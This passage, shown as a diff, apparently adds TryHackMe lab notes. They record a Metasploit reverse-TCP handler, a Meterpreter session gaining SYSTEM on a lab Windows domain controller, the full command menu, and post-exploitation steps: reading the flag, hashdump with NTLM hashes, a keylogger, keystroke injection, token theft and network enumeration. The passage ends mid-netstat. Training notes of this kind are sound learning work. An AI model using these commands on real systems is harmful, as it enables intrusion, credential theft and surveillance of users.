@@ -459,3 +459,464 @@ msf6 > use exploit/multi/handler
 ```text
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set lhost 10.8.19.103
+lhost => 10.8.19.103
+```
+```text
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.8.19.103:4444
+```
+```text
+msf6 exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                              Payload opts
+  --  ----                    -------                              ------------
+  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://10.8.19.103:4444
+```
+```text
+msf6 exploit(multi/handler) > 
+[*] Sending stage (200774 bytes) to 10.10.66.59
+[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.66.59:58280) at 2022-11-15 16:06:34 -0500
+```
+```text
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                       Connection
+  --  ----  ----                     -----------                       ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ FINANCE-01  10.8.19.103:4444 -> 10.10.66.59:5828
+                                                                       0 (10.10.66.59)
+```
+```text
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+```
+```text
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+```
+```text
+meterpreter > search -f flag.txt
+Found 1 result...
+=================
+
+Path                                     Size (bytes)  Modified (UTC)
+----                                     ------------  --------------
+c:\Users\Administrator\Desktop\flag.txt  23            2021-08-13 10:40:20 -0400
+```
+```text
+meterpreter > cat 'c:\Users\Administrator\Desktop\flag.txt'
+THM{SiGBQPMkSvejvmQNEL}
+```
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```text
+meterpreter > hostname
+[-] Unknown command: hostname
+```
+```text
+meterpreter > sysinfo
+Computer        : FINANCE-01
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : THMDEPARTMENT
+Logged On Users : 7
+Meterpreter     : x64/windows
+```
+```text
+meterpreter > getsystem
+[-] Already running as SYSTEM
+```
+```text
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:001a5b3e266374c0df96a298f7f7419f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f8b2337852443abbf18a807b1052bb77:::
+sjohnston:1000:aad3b435b51404eeaad3b435b51404ee:9b06562a2168a1f094aa0d9aae222793:::
+FINANCE-01$:1001:aad3b435b51404eeaad3b435b51404ee:016aa3670d0974f6d5642a01ecd77825:::
+```
+```text
+meterpreter > enumdesktops
+Enumerating all accessible desktops
+
+Desktops
+========
+
+    Session  Station  Name
+    -------  -------  ----
+    0        WinSta0  Default
+    0        WinSta0  Disconnect
+    0        WinSta0  Winlogon
+```
+```text
+meterpreter > idletime
+User has been idle for: 1 hour 12 mins 28 secs
+```
+```text
+meterpreter > keyboard_send hi
+[*] Done
+```
+```text
+meterpreter > keyevent 13 press
+[*] Done
+```
+```text
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+```
+```text
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+```
+```text
+meterpreter > getpid
+Current pid: 3960
+```
+```text
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeImpersonatePrivilege
+SeTcbPrivilege
+```
+```text
+meterpreter > getsid
+Server SID: S-1-5-18
+```
+```text
+meterpreter > localtime
+Local Date/Time: 2022-11-15 14:15:39.615 Pacific Standard Time (UTC-800)
+```
+```text
+meterpreter > steal_token 3960
+Stolen token with username: NT AUTHORITY\SYSTEM
+```
+```text
+meterpreter > arp
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    10.10.0.1        02:c8:85:b5:5a:aa  7
+    10.10.255.255    ff:ff:ff:ff:ff:ff  7
+    224.0.0.22       00:00:00:00:00:00  1
+    224.0.0.22       01:00:5e:00:00:16  7
+    224.0.0.251      01:00:5e:00:00:fb  7
+    224.0.0.252      01:00:5e:00:00:fc  7
+    255.255.255.255  ff:ff:ff:ff:ff:ff  7
+```
+```text
+meterpreter > getproxy
+Auto-detect     : Yes
+Auto config URL : 
+Proxy URL       : 
+Proxy Bypass    :
+```
+```text
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+Interface  7
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:ff:ec:b4:34:2b
+MTU          : 9001
+IPv4 Address : 10.10.66.59
+IPv4 Netmask : 255.255.0.0
+IPv6 Address : fe80::898e:c203:b99c:561f
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+```
+```text
+meterpreter > netstat
+
+Connection list
+===============
+
+    Proto  Local address             Remote address  State        User  Inode  PID/Program name
+    -----  -------------             --------------  -----        ----  -----  ----------------
+    tcp    0.0.0.0:88                0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:135               0.0.0.0:*       LISTEN       0     0      560/svchost.exe
+    tcp    0.0.0.0:389               0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:445               0.0.0.0:*       LISTEN       0     0      4/System
+    tcp    0.0.0.0:464               0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:593               0.0.0.0:*       LISTEN       0     0      560/svchost.exe
+    tcp    0.0.0.0:636               0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:3268              0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:3269              0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:3389              0.0.0.0:*       LISTEN       0     0      1092/svchost.exe
+    tcp    0.0.0.0:5985              0.0.0.0:*       LISTEN       0     0      4/System
+    tcp    0.0.0.0:9389              0.0.0.0:*       LISTEN       0     0      3448/Microsoft.ActiveDirect
+    tcp    0.0.0.0:47001             0.0.0.0:*       LISTEN       0     0      4/System
+    tcp    0.0.0.0:49664             0.0.0.0:*       LISTEN       0     0      692/wininit.exe
+    tcp    0.0.0.0:49665             0.0.0.0:*       LISTEN       0     0      1476/svchost.exe
+    tcp    0.0.0.0:49666             0.0.0.0:*       LISTEN       0     0      1728/svchost.exe
+    tcp    0.0.0.0:49667             0.0.0.0:*       LISTEN       0     0      2136/svchost.exe
+    tcp    0.0.0.0:49669             0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:49670             0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:49671             0.0.0.0:*       LISTEN       0     0      828/lsass.exe
+    tcp    0.0.0.0:49689             0.0.0.0:*       LISTEN       0     0      808/services.exe
+    tcp    0.0.0.0:49698             0.0.0.0:*       LISTEN       0     0      3420/dns.exe
+    tcp    0.0.0.0:57057             0.0.0.0:*       LISTEN       0     0      3456/dfsrs.exe
+    tcp    0.0.0.0:58284             0.0.0.0:*       LISTEN       0     0      1684/spoolsv.exe
+    tcp    10.10.66.59:53            0.0.0.0:*       LISTEN       0     0      3420/dns.exe
+    tcp    10.10.66.59:139           0.0.0.0:*       LISTEN       0     0      4/System
+    tcp    10.10.66.59:56876         74.125.193.94:  SYN_SENT     0     0      3988/GoogleUpdate.exe
+                                     80
+    tcp    10.10.66.59:58280         10.8.19.103:44  ESTABLISHED  0     0      3960/rundll32.exe
+                                     44
+    tcp    127.0.0.1:53              0.0.0.0:*       LISTEN       0     0      3420/dns.exe
+    tcp6   :::88                     :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::135                    :::*            LISTEN       0     0      560/svchost.exe
+    tcp6   :::389                    :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::445                    :::*            LISTEN       0     0      4/System
+    tcp6   :::464                    :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::593                    :::*            LISTEN       0     0      560/svchost.exe
+    tcp6   :::636                    :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::3268                   :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::3269                   :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::3389                   :::*            LISTEN       0     0      1092/svchost.exe
+    tcp6   :::5985                   :::*            LISTEN       0     0      4/System
+    tcp6   :::9389                   :::*            LISTEN       0     0      3448/Microsoft.ActiveDirecto
+    tcp6   :::47001                  :::*            LISTEN       0     0      4/System
+    tcp6   :::49664                  :::*            LISTEN       0     0      692/wininit.exe
+    tcp6   :::49665                  :::*            LISTEN       0     0      1476/svchost.exe
+    tcp6   :::49666                  :::*            LISTEN       0     0      1728/svchost.exe
+    tcp6   :::49667                  :::*            LISTEN       0     0      2136/svchost.exe
+    tcp6   :::49669                  :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::49670                  :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::49671                  :::*            LISTEN       0     0      828/lsass.exe
+    tcp6   :::49689                  :::*            LISTEN       0     0      808/services.exe
+    tcp6   :::49698                  :::*            LISTEN       0     0      3420/dns.exe
+    tcp6   :::57057                  :::*            LISTEN       0     0      3456/dfsrs.exe
+    tcp6   :::58284                  :::*            LISTEN       0     0      1684/spoolsv.exe
+    tcp6   ::1:53                    :::*            LISTEN       0     0      3420/dns.exe
+    tcp6   ::1:389                   ::1:49677       ESTABLISHED  0     0      828/lsass.exe
+    tcp6   ::1:389                   ::1:49678       ESTABLISHED  0     0      828/lsass.exe
+    tcp6   ::1:389                   ::1:49696       ESTABLISHED  0     0      828/lsass.exe
+    tcp6   ::1:49677                 ::1:389         ESTABLISHED  0     0      3284/ismserv.exe
+    tcp6   ::1:49678                 ::1:389         ESTABLISHED  0     0      3284/ismserv.exe
+    tcp6   ::1:49696                 ::1:389         ESTABLISHED  0     0      3420/dns.exe
+    tcp6   fe80::898e:c203:b99c:561  :::*            LISTEN       0     0      3420/dns.exe
+           f:53
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
+           f:389                     3:b99c:561f:49
+                                     697
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
+           f:389                     3:b99c:561f:57
+                                     052
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
+           f:389                     3:b99c:561f:57
+                                     055
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
+           f:49669                   3:b99c:561f:57
+                                     054
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      828/lsass.exe
+           f:49669                   3:b99c:561f:58
+                                     325
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  ESTABLISHED  0     0      3420/dns.exe
+           f:49697                   3:b99c:561f:38
+                                     9
+    tcp6   fe80::898e:c203:b99c:561  fe80::898e:c20  TIME_WAIT    0     0      0/[System Process]
